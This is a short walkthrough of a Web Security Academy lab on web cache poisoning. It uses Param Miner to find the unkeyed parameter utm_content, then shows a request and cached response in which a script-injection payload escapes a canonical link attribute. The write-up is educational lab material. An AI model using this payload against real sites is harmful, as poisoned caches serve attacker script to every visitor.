# **Web cache poisoning via an unkeyed query parameter**

Task: This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the cache with a response that executes `alert(1)` in the victim's browser.

Toolkit: BurpSuite, Browser

1. use param miner to guess query params

GET /? HTTP/2  
Host: [0abe001104b4eadb85198ce4003100b9.web-security-academy.net](http://0abe001104b4eadb85198ce4003100b9.web-security-academy.net)

Initiating url bruteforce on 0abe001104b4eadb85198ce4003100b9.web-security-academy.net  
Identified parameter on 0abe001104b4eadb85198ce4003100b9.web-security-academy.net: utm\_content

2. use parameter and try to escape from href

GET /?utm\_content=1'/\>\<script\>alert(1)\</script\> HTTP/2  
Host: [0abe001104b4eadb85198ce4003100b9.web-security-academy.net](http://0abe001104b4eadb85198ce4003100b9.web-security-academy.net)

HTTP/2 200 OK  
Content-Type: text/html; charset=utf-8  
X-Frame-Options: SAMEORIGIN  
Cache-Control: max-age=35  
Age: 0  
X-Cache: hit  
Content-Length: 8419

\<\!DOCTYPE html\>  
\<html\>  
\<\!--LAB\_HEAD\_START--\>  
    \<head\>  
        \<link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet\>  
        \<link href=/resources/css/labsBlog.css rel=stylesheet\>  
        \<link rel="canonical" href='//[0abe001104b4eadb85198ce4003100b9.web-security-academy.net/?utm\_content=1'/](http://0abe001104b4eadb85198ce4003100b9.web-security-academy.net/?utm_content=1'/)\>  
\<script\>alert(1)\</script\>  
'/\>  
        \<title\>Web cache poisoning via an unkeyed query parameter\</title\>
